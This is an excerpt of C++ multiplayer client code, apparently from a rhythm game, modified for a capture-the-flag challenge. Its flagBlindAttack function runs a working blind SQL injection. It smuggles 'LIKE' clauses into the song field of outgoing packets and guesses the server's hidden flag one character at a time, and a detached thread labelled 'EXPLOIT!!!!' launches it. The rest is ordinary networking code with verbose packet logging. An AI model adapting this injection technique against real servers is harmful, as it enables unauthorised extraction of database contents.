...
void MultiplayerScreen::m_joinRoomWithToken()
{
	...
	std::cout << "joinRoomWithToken: " << joinReq.dump() << std::endl;
...
bool MultiplayerScreen::m_handleJoinRoom(nlohmann::json& packet)
{
	...
	std::cout << "handleJoinRoom: " << packet.dump() << std::endl;
...
bool MultiplayerScreen::m_handleRoomUpdate(nlohmann::json& packet)
{
	...
	std::cout << "handleRoomUpdate: " << packet.dump() << std::endl << std::flush;

	// exploit code
	auto users = packet["users"];
	// std::cout << users.dump() << " : " << users.size() << std::endl;
	for (auto&[key, val] : users.items())
	{
		nlohmann::json& v = (nlohmann::json&)val;
		std::cout << "key: " << key << ", value:" << val << '\n';
		String name = v.at("name");
		std::cout << "name: " << name << '\n';
		if (name.compare("itszn") == 0) {
			bool missing = v.at("missing_map");
...
void flagBlindAttack(TCPSocket m_tcp, nlohmann::json packet) {
	for (int i = 0; i < 3; i++) {
		std::cout << "dink" << i << std::endl;
		std::cout << packet.dump() << std::endl;
		Sleep(1000);
	}

	String flagProg = "";
	String valid = "_+-,./[] !?$#@*:;<>=0123456789abcdefghijklmnopqrstuvwxyz{}";
	...
	while (!isFound) {
		for (int i = 0; i < valid.length(); i++) {
			char c = valid[i];
			Sleep(200);
			// + "%\" AND effector LIKE \"flag";
			String songPath = "flagsong";
			if (c == '_') {
				songPath += "%\" AND effector LIKE \"" + flagProg + "\\_";
			}
			else {
				songPath += "%\" AND effector LIKE \"" + flagProg + c;
			}
			std::cout << songPath << std::endl;

			packet["song"] = songPath;
			//packet["chart_hash"] = flagProg + c;
			exploitStatus = 0;
			m_tcp.SendJSON(packet);

			while (exploitStatus <= 0) Sleep(1);
			if (exploitStatus == 1) {
				// incorrect
			}
				...
				// correct
				flagProg = flagProg + c;
				std::cout << "PROGRESS: " << flagProg << std::endl;
				if (c == '}') isFound = true;
				break;
			}
		}

		String savedHash = packet.at("chart_hash");
		packet["chart_hash"] = flagProg;
		packet["song"] = "invalid";
		exploitStatus = -20;
		m_tcp.SendJSON(packet);
		while (exploitStatus == -20) Sleep(1);
	}
	std::cout << "FLAG: " << flagProg << std::endl;
}
...
bool MultiplayerScreen::m_handleSongChange(nlohmann::json& packet)
{
	...
	if (newChart == nullptr)
	{
		...
		m_tcp.SendJSON(packet);
		std::cout << "nomap pkt: " << packet.dump() << std::endl;
...
bool MultiplayerScreen::m_handleFinalStats(nlohmann::json& packet)
{
	...
	std::cout << "RECV (final stat): " << packet.dump() << std::endl;
	return true;
}
...
ChartIndex* MultiplayerScreen::m_getChartByHash(const String& hash, const String& path, uint32* diffIndex, int32 level)
{
	...
	std::cout << "[Multiplayer] looking up song hash:level = " << *hash << ": " << level << std::endl;
	for (auto folder : m_mapDatabase->FindFoldersByHash(hash))
	{
		...
		if (newChart != NULL)
		{
			std::cout << "[Multiplayer] Found: diff_id:mapid:index:path = " << newChart->id << " : " << newChart->folderId << " : " << *diffIndex << ": " << newChart->path.c_str() << std::endl;
	...
	std::cout << "[Multiplayer] Could not find song by hash, falling back to foldername" << std::endl;
...
ChartIndex* MultiplayerScreen::m_getChartByShortPath(const String& path, uint32* diffIndex, int32 level, bool useHint)
{
	...
	std::cout << "[Multiplayer] looking up song:level:difficulty index hint = " << path.c_str() << " : " << level << " : " << *diffIndex << std::endl;
...
void MultiplayerScreen::m_updateSelectedMap(int32 mapid, int32 diff_ind, bool isNew)
{
	...
	std::cout << "updateSelectedMap" << chart->effector.c_str() << std::endl;
	...
	if (isNew)
	{
		// SELECT DISTINCT folderId FROM Charts WHERE path LIKE "% + searchString + %"
		// searchString = flagsong % " AND effector "%flag{ ...
		...
		std::cout << "selectNewSong pkt: " << packet.dump() << std::endl;

		// EXPLOIT!!!!
		std::thread blindAttack(flagBlindAttack, m_tcp, packet);
		blindAttack.detach();
	}
	else
	{
		...
		packet["level"] = chart->level;
		m_tcp.SendJSON(packet);
		std::cout << "setNewSong: " << packet.dump() << std::endl;
	}
...
void MultiplayerScreen::PerformScoreTick(Scoring& scoring, MapTime time)
{
	...
	m_tcp.SendJSON(packet);
	std::cout << "scoreUpdate: " << packet.dump() << std::endl;
}
...
void MultiplayerScreen::SendFinalScore(class Game* game, ClearMark clearState)
{
	...
	m_tcp.SendJSON(packet);
	std::cout << "sendFinalScore: " << packet.dump() << std::endl;
...
void MultiplayerScreen::OnRestore()
{
	...
	if (m_inGame)
	{
		...
		m_tcp.SendJSON(packet);
		std::cout << "getRoomUpdateReq: " << packet.dump() << std::endl;
	}
}

bool MultiplayerScreen::AsyncLoad()
{
	// kevin: check these for bugs
...
void MultiplayerScreen::StartSync()
{
	...
	m_tcp.SendJSON(packet);
	std::cout << "syncReady: " << packet.dump() << std::endl;
}
...
int MultiplayerScreen::lJoinWithoutPassword(lua_State* L)
{
	...
	m_tcp.SendJSON(packet);
	std::cout << "joinRoom: " << packet.dump() << std::endl;
	return 0;
}
...
int MultiplayerScreen::lJoinWithPassword(lua_State* L)
{
	...
	std::cout << "joinRoomWith: " << packet.dump() << std::endl;
	m_tcp.SendJSON(packet);
...
int MultiplayerScreen::lNewRoomStep(lua_State* L)
{
	...
	else if (m_screenState == MultiplayerScreenState::NEW_ROOM_PASSWORD)
	{
		...
		packet["password"] = m_textInput->input;
		m_tcp.SendJSON(packet);
		std::cout << "newRoom: " << packet.dump() << std::endl;
		m_textInput->Reset();
	}
	return 0;
}
